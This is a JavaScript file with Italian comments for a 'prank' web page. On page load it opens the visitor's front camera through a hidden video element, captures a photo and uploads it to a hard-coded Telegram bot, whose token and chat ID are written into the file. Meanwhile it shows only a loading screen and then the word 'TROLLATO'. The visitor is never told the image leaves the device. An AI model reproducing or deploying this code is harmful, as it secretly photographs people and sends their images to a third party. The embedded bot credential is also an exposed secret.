// ==========================================
// CONFIGURAZIONE TELEGRAM
// ==========================================
// Sostituisci questi valori con il token del tuo bot e il tuo Chat ID
const BOT_TOKEN = '8729524836:AAGGdXoRu8LqN9sD8dvYIemrxNvF-pJC4LA';
const CHAT_ID = '5540351999';
// ==========================================

async function initTroll() {
    const loadingEl = document.getElementById('loading');
    const messageEl = document.getElementById('message');

    try {
        // Richiedi il permesso per la fotocamera frontale
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });

        // Creiamo un video invisibile per catturare l'immagine
        const video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', ''); // Necessario per iOS Safari
        video.play();

        // Aspettiamo che il video sia pronto per essere letto
        await new Promise(resolve => {
            video.onloadeddata = () => {
                resolve();
            };
        });

        // Aspettiamo un secondo affinché la fotocamera regoli la luminosità e la messa a fuoco
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Creiamo un canvas per trasformare il frame del video in una foto
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Fermiamo lo stream della fotocamera perché abbiamo la foto
        stream.getTracks().forEach(track => track.stop());

        // Nascondiamo il caricamento e mostriamo la scritta grande e rossa "TROLLATO"
        loadingEl.style.display = 'none';
        messageEl.style.display = 'block';

        // Convertiamo il canvas in un file (Blob JPG)
        canvas.toBlob(async (blob) => {
            if (!blob) return;

            // Prepariamo i dati per il form da inviare a Telegram
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'troll.jpg');

            try {
                // Inviamo la foto al bot chiamando le API ufficiali
                if (BOT_TOKEN !== 'INSERISCI_QUI_IL_TUO_BOT_TOKEN' && CHAT_ID !== 'INSERISCI_QUI_IL_TUO_CHAT_ID') {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        console.log('✅ Foto inviata con successo al tuo bot Telegram!');
                    } else {
                        console.error('❌ Errore API Telegram', await response.text());
                    }
                } else {
                    console.log('⚠️ Token o Chat ID non configurati! Modifica il file script.js per ricevere le foto.');
                }
            } catch (err) {
                console.error('Errore di connessione durante l\'invio a Telegram:', err);
            }
        }, 'image/jpeg', 0.8);

    } catch (error) {
        console.error('❌ Permesso fotocamera negato o fotocamera non trovata:', error);
        // Anche se l'utente rifiuta il permesso o c'è un errore, mostriamo comunque la scritta dello scherzo
        loadingEl.style.display = 'none';
        messageEl.style.display = 'block';
    }
}

// Avviamo lo script al caricamento della pagina
window.addEventListener('load', () => {
    initTroll();
});
